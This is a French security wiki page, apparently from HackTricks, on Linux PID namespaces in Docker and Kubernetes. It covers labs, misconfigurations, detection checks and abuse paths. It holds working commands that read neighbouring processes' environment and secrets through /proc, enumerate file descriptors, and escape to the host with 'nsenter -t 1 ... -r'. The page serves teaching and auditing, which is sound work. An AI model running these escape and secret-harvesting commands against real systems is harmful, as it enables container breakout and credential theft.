# Espace de noms PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d’ensemble

L’espace de noms PID contrôle la numérotation des processus et les processus visibles. C’est pourquoi un conteneur peut avoir son propre PID 1 sans être une véritable machine. À l’intérieur de l’espace de noms, la charge de travail voit ce qui semble être un arbre de processus local. À l’extérieur, l’hôte voit toujours les véritables PID de l’hôte et l’ensemble des processus.<sup>[[3]](#references)</sup>

Du point de vue de la sécurité, l’espace de noms PID est important, car la visibilité des processus est précieuse. Dès qu’une charge de travail peut voir les processus de l’hôte, elle peut être en mesure d’observer les noms des services, les arguments de ligne de commande, les secrets transmis dans les arguments des processus, les informations issues de l’environnement via `/proc` et les cibles potentielles d’entrée dans un espace de noms. Si elle peut faire plus que simplement voir ces processus — par exemple leur envoyer des signaux ou utiliser ptrace dans les conditions appropriées — le problème devient beaucoup plus grave.

## Fonctionnement

Un nouvel espace de noms PID commence avec sa propre numérotation interne des processus. Le premier processus créé à l’intérieur devient le PID 1 du point de vue de cet espace de noms, ce qui signifie aussi qu’il bénéficie d’une sémantique particulière, similaire à celle d’init, pour les processus enfants orphelins et la gestion des signaux. Cela explique de nombreuses particularités des conteneurs liées aux processus init, à la récupération des processus zombies et à l’utilisation occasionnelle de petits wrappers init dans les conteneurs.<sup>[[3]](#references)</sup>

Les espaces de noms PID forment une hiérarchie. Un processus dans un espace de noms ancêtre peut adresser les processus descendants à l’aide du PID qui leur est attribué dans cet espace de noms, mais un descendant ne peut pas adresser les tâches propres aux ancêtres via les appels système ordinaires basés sur les PID, ni utiliser `setns()` pour remonter vers un espace de noms PID ancêtre. Un procfs appartenant à un ancêtre, délibérément exposé au descendant, peut néanmoins leak la vue des processus de l’ancêtre. De plus, rejoindre un espace de noms PID avec `setns()` modifie l’espace de noms des **futurs processus enfants**, et non celui de l’appelant lui-même ; les outils effectuent donc un fork après l’avoir rejoint. Un montage procfs conserve la vue PID du processus qui l’a monté, c’est pourquoi créer un nouveau procfs après `unshare(CLONE_NEWPID)` est pertinent pour la sécurité, et pas seulement cosmétique.<sup>[[3]](#references)</sup>

La leçon importante en matière de sécurité est qu’un processus peut sembler isolé parce qu’il ne voit que son propre arbre de PID, mais cet isolement peut être supprimé délibérément. Docker permet de le faire avec `--pid=host`, tandis que Kubernetes utilise `hostPID: true`. Une fois que le conteneur a rejoint l’espace de noms PID de l’hôte, la charge de travail voit directement les processus de l’hôte, et de nombreuses voies d’attaque ultérieures deviennent beaucoup plus réalistes.

## Labo

Pour créer manuellement un espace de noms PID :

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Le shell voit désormais une vue privée des processus. L’option `--mount-proc` est importante, car elle monte une instance de procfs correspondant au nouvel espace de noms PID, ce qui rend la liste des processus cohérente depuis l’intérieur.<sup>[[3]](#references)</sup>

Pour comparer le comportement des conteneurs :

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

La différence est immédiate et facile à comprendre, ce qui en fait un bon premier lab pour les lecteurs.

## Utilisation à l’exécution

Les conteneurs habituels dans Docker, Podman, containerd et CRI-O ont leur propre PID namespace. Les conteneurs Kubernetes ont normalement des vues PID distinctes ; `shareProcessNamespace: true` crée délibérément une vue commune à tout le Pod.<sup>[[4]](#references)</sup> En revanche, `hostPID: true` sélectionne le PID namespace du nœud. Les environnements LXC/Incus reposent sur la même primitive du noyau, même si les cas d’utilisation des conteneurs système peuvent exposer des arborescences de processus plus complexes et inciter à recourir à davantage de raccourcis de débogage.

La même règle s’applique partout : si le runtime a choisi de ne pas isoler le PID namespace, il s’agit d’une réduction délibérée de la frontière du conteneur.

## Mauvaises configurations

La mauvaise configuration la plus classique est le partage du PID de l’hôte. Les équipes le justifient souvent par la facilité de débogage, de surveillance ou de gestion des services, mais il faut toujours le considérer comme une exception de sécurité importante. Même si le conteneur ne dispose d’aucun moyen immédiat d’écriture sur les processus de l’hôte, la seule visibilité peut révéler beaucoup d’informations sur le système. Dès que des capacités telles que `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutés, le risque augmente considérablement.

Une autre erreur consiste à supposer que, puisque la charge de travail ne peut pas tuer ni utiliser ptrace sur les processus de l’hôte par défaut, le partage du PID de l’hôte est donc inoffensif. Cette conclusion ignore la valeur de l’énumération, la disponibilité de cibles pour entrer dans un namespace et la manière dont la visibilité des PID se combine à d’autres contrôles affaiblis.

### Partage des processus à l’échelle d’un Pod Kubernetes

`shareProcessNamespace: true` est différent de `hostPID` : il expose les processus des **autres conteneurs du même Pod**, et non ceux du nœud. Un sidecar compromis ou un conteneur de débogage peut alors énumérer les lignes de commande et les données d’environnement des conteneurs voisins, sous réserve des contrôles d’accès de procfs, envoyer des signaux lorsque les identifiants le permettent et parcourir le système de fichiers d’un conteneur voisin via `/proc/<pid>/root`. Kubernetes avertit explicitement que les secrets présents dans les lignes de commande ou l’environnement, ainsi que les systèmes de fichiers des conteneurs, ne sont alors protégés que par les permissions Unix applicables.<sup>[[4]](#references)</sup>

Vérification utile côté cluster :

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Depuis un conteneur compromis dans un espace de noms PID partagé à l’échelle du Pod, testez d’abord l’accès réel au lieu de supposer que visibilité signifie lisibilité :<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Conteneurs éphémères ciblés dans un Pod Kubernetes existant

Une identité Kubernetes autorisée à modifier `pods/ephemeralcontainers` peut ajouter un debugger à un Pod en cours d'exécution, même si `shareProcessNamespace` n'est pas défini. Avec `--target`, le debugger rejoint le namespace de processus du conteneur nommé si le runtime prend en charge le ciblage des namespaces. Cela donne une vue des processus de ce conteneur, et non du namespace PID de l'hôte.<sup>[[5]](#references)</sup>

L'API utilise un sous-resource distinct : vérifiez donc les droits `patch`/`update` au lieu de supposer que les permissions d'écriture ordinaires sur les Pods le couvrent.<sup>[[6]](#references)</sup>

Pour un Pod et un conteneur dans un namespace autorisé, testez la vue ciblée :<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Si le runtime ne prend pas en charge le ciblage, le debugger peut ne pas démarrer ou rester dans un PID namespace isolé.<sup>[[5]](#references)</sup> Si le ciblage fonctionne, utilisez les vérifications de la section [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) pour tester l’accès à `/proc/<pid>`. La visibilité ne donne pas le droit de lire les secrets de la cible ni de lui envoyer des signaux : les identifiants Unix et les contrôles d’accès de procfs s’appliquent toujours.<sup>[[4]](#references)[[8]](#references)</sup> Les Pod Security Standards imposent également des restrictions aux paramètres privilégiés des conteneurs éphémères.<sup>[[7]](#references)</sup>

## Abus

Si le PID namespace de l’hôte est partagé, un attaquant peut inspecter les processus de l’hôte, récupérer les arguments des processus, repérer des services intéressants, trouver des PID candidats pour `nsenter` ou combiner la visibilité des processus avec des privilèges liés à ptrace pour interférer avec les workloads de l’hôte ou voisins. Dans certains cas, le simple fait de repérer le bon processus de longue durée suffit à réorienter le reste du plan d’attaque.

La première étape pratique consiste toujours à confirmer que les processus de l’hôte sont réellement visibles :

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Une fois les PID de l’hôte visibles, les arguments des processus et les cibles d’entrée dans les namespaces constituent souvent les sources d’information les plus utiles :

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Si `nsenter` est disponible et que les privilèges sont suffisants, vérifiez si un processus hôte visible peut servir de passerelle entre espaces de noms :

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Même lorsque l'accès est bloqué, le partage des PID de l'hôte est déjà utile, car il révèle l'organisation des services, les composants d'exécution et les processus privilégiés susceptibles d'être ciblés ensuite. La visibilité des PID ne donne **pas** à elle seule la permission d'envoyer des signaux, de tracer des processus, de lire des entrées sensibles de `/proc/<pid>` ou de rejoindre les autres namespaces de la cible ; les identifiants, le caractère dumpable, les capabilities dans le user namespace propriétaire du namespace de la cible, les règles Yama/LSM et seccomp restent déterminants.<sup>[[3]](#references)</sup> Voir [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) pour des exemples d'injection de processus.

La visibilité des PID de l'hôte rend également l'abus de descripteurs de fichiers plus réaliste. Si un processus privilégié de l'hôte ou une charge de travail voisine a un fichier ou un socket sensible ouvert, l'attaquant peut éventuellement inspecter `/proc/<pid>/fd/` et accéder à l'objet sous-jacent, selon les vérifications de type ptrace, le propriétaire, les options de montage de procfs, le type d'objet et le modèle du service ciblé. Voir simplement un lien symbolique FD ne signifie pas qu'il est possible de l'ouvrir, et un socket ne peut pas être dupliqué en ouvrant simplement son lien symbolique `/proc/<pid>/fd/N`. Pour la primitive distincte `pidfd_getfd()` et ses vérifications d'autorisation, voir [Vol de FD via pidfd_getfd lors d'une course de sortie de ptrace Linux](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Ces commandes sont utiles, car elles indiquent si `hidepid=1` ou `hidepid=2` réduit la visibilité entre processus et si des descripteurs manifestement intéressants, tels que des fichiers secrets ouverts, des journaux ou des sockets Unix, sont visibles.

### Exemple complet : PID de l’hôte + `nsenter`

Le partage du PID de l’hôte peut permettre une évasion de l’hôte lorsque le processus dispose des capacités nécessaires pour rejoindre les espaces de noms de l’hôte et adopter la racine du processus hôte. `nsenter --root` (`-r`) est nécessaire pour cette dernière opération : changer d’espace de noms de montage ne modifie pas le répertoire racine de l’appelant.<sup>[[9]](#references)</sup> L’accès à `/proc/1/root` est soumis à une vérification de lecture ptrace, tandis que le changement de racine nécessite `CAP_SYS_CHROOT` dans l’espace de noms utilisateur de l’appelant.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Si la commande réussit, le nouveau shell utilise les namespaces mount, UTS, network, IPC et PID de l’hôte, ainsi que le système de fichiers racine du PID 1. Vérifiez l’identité effective et les accès au lieu de supposer que la seule visibilité des PID confère des privilèges sur l’hôte.<sup>[[9]](#references)</sup>

Même lorsque `nsenter` est absent, le même résultat peut être obtenu via le binaire de l’hôte si le système de fichiers de l’hôte est monté :

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Notes récentes sur l’exécution

Certaines attaques liées aux espaces de noms PID ne sont pas dues à des erreurs de configuration classiques `hostPID: true`, mais à des bugs d’implémentation du runtime concernant l’application des protections de procfs lors de la configuration du conteneur.

#### Course de `maskedPaths` vers le procfs de l’hôte

Dans les versions vulnérables de `runc`, des attaquants capables de contrôler l’image du conteneur ou la charge de travail de `runc exec` pouvaient tenter de gagner une course pendant la phase de masquage, en remplaçant le `/dev/null` côté conteneur par un lien symbolique vers un chemin procfs sensible, comme `/proc/sys/kernel/core_pattern`. Si la course réussissait, le montage bind du chemin masqué pouvait cibler la mauvaise cible et exposer au nouveau conteneur des paramètres procfs globaux à l’hôte.<sup>[[1]](#references)</sup>

Commande utile pour l’examen :

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Cela est important, car l’impact final peut être le même qu’une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` accessible en écriture, suivi d’une exécution de code sur l’hôte ou d’un déni de service. Les pages dédiées aux [chemins masqués](../masked-paths.md) et aux [montages sensibles de l’hôte](../../sensitive-host-mounts.md) couvrent la surface d’attaque générale de procfs sans la répéter ici.

#### Injection dans un namespace avec `insject`

Les outils d’injection dans un namespace, tels que `insject`, montrent que l’interaction avec un PID namespace ne nécessite pas toujours d’entrer dans le namespace cible avant la création du processus. Un helper peut s’y attacher plus tard, utiliser `setns()` et exécuter des commandes tout en conservant la visibilité sur l’espace de PID cible :<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Ce type de technique est surtout utile pour le débogage avancé, les outils offensifs et les workflows de post-exploitation, lorsque le contexte du namespace doit être rejoint une fois que le runtime a déjà initialisé la charge de travail.

### Schémas d’abus de FD associés

Deux schémas méritent d’être explicitement signalés lorsque les PID de l’hôte sont visibles. Premièrement, un processus privilégié peut conserver un descripteur de fichier sensible ouvert après un `execve()` parce qu’il n’a pas été marqué `O_CLOEXEC`. Deuxièmement, des services peuvent transmettre des descripteurs de fichier via des sockets Unix au moyen de `SCM_RIGHTS`. Dans les deux cas, l’objet intéressant n’est plus le chemin d’accès, mais le handle déjà ouvert qu’un processus moins privilégié peut hériter ou recevoir.

C’est important dans le contexte des conteneurs, car le handle peut pointer vers `docker.sock`, un journal privilégié, un fichier contenant un secret de l’hôte ou un autre objet de grande valeur, même si le chemin lui-même n’est pas directement accessible depuis le système de fichiers du conteneur.

## Vérifications

Ces commandes servent à déterminer si le processus dispose d’une vue privée des PID ou s’il peut déjà énumérer un ensemble de processus beaucoup plus vaste.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Qu'est-ce qui est intéressant ici :<sup>[[3]](#references)</sup>

- Si la liste des processus contient des services clairement associés à l'hôte, le partage des PID de l'hôte est probablement déjà activé.
- Voir uniquement une petite arborescence locale au conteneur est le comportement normal ; voir `systemd`, `dockerd` ou des daemons sans rapport ne l'est pas.
- `NSpid` peut révéler le mapping des PID entre les namespaces imbriqués. La valeur la plus à gauche est relative au namespace PID associé au montage procfs, suivie des valeurs des namespaces imbriqués successifs.
- `readlink /proc/self/ns/pid` ne suffit pas à prouver `hostPID` : un conteneur isolé possède également un inode de namespace PID valide. Recoupez cette information avec la liste des processus, le montage procfs, la configuration du runtime et un inode de namespace côté hôte, si disponible.
- Dès que les PID de l'hôte sont visibles, même les informations en lecture seule sur les processus deviennent utiles pour la reconnaissance.

Si vous découvrez qu'un conteneur partage les PID de l'hôte, ne considérez pas cela comme une simple différence cosmétique. Cela modifie considérablement ce que la charge de travail peut observer et potentiellement affecter.





## References

- [1] [Avis de sécurité runc : évasion de conteneur par abus de « masked path » dû à des conditions de concurrence sur les montages (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Sortie de l'outil – insject : un injecteur de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Livre Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Partager le namespace des processus entre les conteneurs d'un Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Déboguer des Pods en cours d'exécution](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP sur les conteneurs éphémères](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Normes de sécurité des Pods](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
